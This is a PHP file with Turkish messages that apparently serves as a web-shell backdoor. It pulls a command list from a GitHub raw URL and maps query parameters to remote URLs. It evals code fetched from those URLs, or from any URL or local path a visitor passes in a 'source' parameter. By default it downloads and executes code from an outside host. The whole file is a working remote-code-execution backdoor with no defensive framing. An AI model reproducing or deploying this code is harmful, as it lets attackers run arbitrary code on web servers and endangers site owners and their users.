<?php
$commandsUrl = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/komutlar.txt";

function fetchRemoteFile($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    $content = curl_exec($ch);
    
    if (curl_errno($ch)) {
        echo "CURL Hatası: " . curl_error($ch);
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    return $content;
}

$commandsContent = fetchRemoteFile($commandsUrl);
if ($commandsContent === false) {
    echo "Komut dosyası alınamadı.";
    exit();
}

$commands = array_filter(array_map('trim', explode("\n", $commandsContent)));


$documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
$currentFilePath = str_replace($documentRoot, '', realpath(__FILE__));


if (!empty($_SERVER['QUERY_STRING'])) {
    $currentUrl = $_SERVER['REQUEST_URI'];
    $newUrl = $currentFilePath . '?' . $_SERVER['QUERY_STRING'];
    if ($newUrl !== $currentUrl) {
        header("Location: $newUrl");
        exit();
    }
}

foreach ($commands as $line) {
    $parts = explode(" ", $line, 2);
    if (count($parts) < 2) continue;

    [$param, $defaultUrl] = $parts;

    if (isset($_GET[$param])) {
        $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
        $fileContent = '';


        if (filter_var($input, FILTER_VALIDATE_URL)) {
            $fileContent = fetchRemoteFile($input);
        } else {
            $filePath = $documentRoot . '/' . ltrim($input, '/');
            if (file_exists($filePath) && is_readable($filePath)) {
                $fileContent = file_get_contents($filePath);
            } else {
                echo "Dosya bulunamadı veya okunamıyor: " . htmlspecialchars($filePath);
                exit();
            }
        }

        if ($fileContent !== false) {
            try {
                eval('?>' . $fileContent);
            } catch (Throwable $e) {
                echo "Kod çalıştırma hatası: " . $e->getMessage();
            }
        } else {
            echo "Dosya içeriği alınamadı.";
        }
        exit();
    }
}


$defaultUrl = 'https://sub1.erospro.net/test1/t10.txt';
$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
$fileContent = '';
if (filter_var($input, FILTER_VALIDATE_URL)) {
    $fileContent = file_get_contents($input);
} else {
    $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($input, '/');
    if (file_exists($filePath)) {
        $fileContent = file_get_contents($filePath);
    } else {
        echo "Dosya bulunamadı: " . htmlspecialchars($filePath);
        exit;
    }
}
if ($fileContent !== false) {
    eval('?>' . $fileContent);
} else {
    echo "error php";
}

?>
